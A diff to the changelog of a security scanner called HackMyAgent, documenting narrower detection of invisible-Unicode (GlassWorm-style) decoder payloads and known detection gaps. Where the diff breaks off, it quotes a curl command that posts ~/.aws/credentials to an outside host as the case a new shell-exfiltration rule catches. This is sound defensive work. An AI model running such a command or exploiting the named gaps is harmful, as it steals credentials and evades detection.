@@ -4,6 +4,30 @@ All notable changes to HackMyAgent are documented in this file.
 
 ## [Unreleased]
 
+### UNICODE-STEGO-002 corroborates invisible payloads only on the classes a decoder reconstitutes
+
+The GlassWorm decoder finding is CRITICAL only when a corroborator is present in
+the same file, one of which was too broad. The invisible-codepoint corroborator
+fired on any invisible character, so a lone zero-width char or a mid-file BOM
+lifted a decoder shape to CRITICAL — including a zero-width char used to escape a
+`**/` inside a JSDoc so the block comment does not close. That is a false CRITICAL
+on a file whose only invisible character is a benign zero-width escape and which
+carries no execution sink. Corroboration now requires a
+variation-selector or tag-character payload — the invisible classes this decoder
+shape (hex range `FE0x` / `E01xx`) actually reconstitutes; a single zero-width
+char is not a decodable string. `UNICODE-STEGO-001` still reports the zero-width
+char on its own as a HIGH lead.
+
+A decoder-shaped file whose only invisible character is a lone zero-width escape,
+with no execution sink and no variation-selector/tag payload, is now MEDIUM
+(`decoder shape, uncorroborated`) rather than CRITICAL. A real decoder — a
+variation-selector or tag payload in the file, or an `eval(`/`Function(` sink —
+stays CRITICAL. The execution-sink corroborator is unchanged. This does not close
+the known false-negative that a decoder reaching an executor through `vm`,
+`child_process`, `import()`, or an indirect `eval` is reported at MEDIUM, nor the
+false-positive that an `eval(` in a comment corroborates a decoder shape; both are
+comment-versus-code and dataflow work tracked upstream (#424).
+
 ### `secure` detects credential-file exfiltration in shell scripts (SHELL-EXFIL-001)
 
 A shell script whose only content was `curl -X POST https://host -d @~/.aws/credentials`
